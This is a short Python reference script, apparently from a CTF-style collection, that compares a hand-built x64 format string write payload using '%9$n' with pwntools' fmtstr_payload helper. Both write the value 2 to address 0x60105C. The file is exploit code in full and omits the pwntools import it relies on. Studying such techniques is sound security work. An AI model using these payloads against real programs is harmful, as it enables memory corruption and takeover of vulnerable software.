"""
x64 format string write techniques comparison.

Category: Pwn > Format String

Description:
    Demonstrates two methods for format string writes: manual payload
    construction vs pwntools fmtstr_payload helper. Useful reference for
    understanding format string internals.

Usage:
    python fmt_write_methods.py

Dependencies:
    - pwntools
"""
# ============= METHOD 1 =============
numbwritten = 1
what = 0x2

p = b'a' * what
p += b'%9$n'
p = p.ljust(8, b'a')
p += b'a' * numbwritten
p += p64(0x60105C)
print(p)
# ====================================

# ============= METHOD 2 =============
p = b'a' + fmtstr_payload(8, {0x60105c: 0x2}, numbwritten=1)
# ====================================
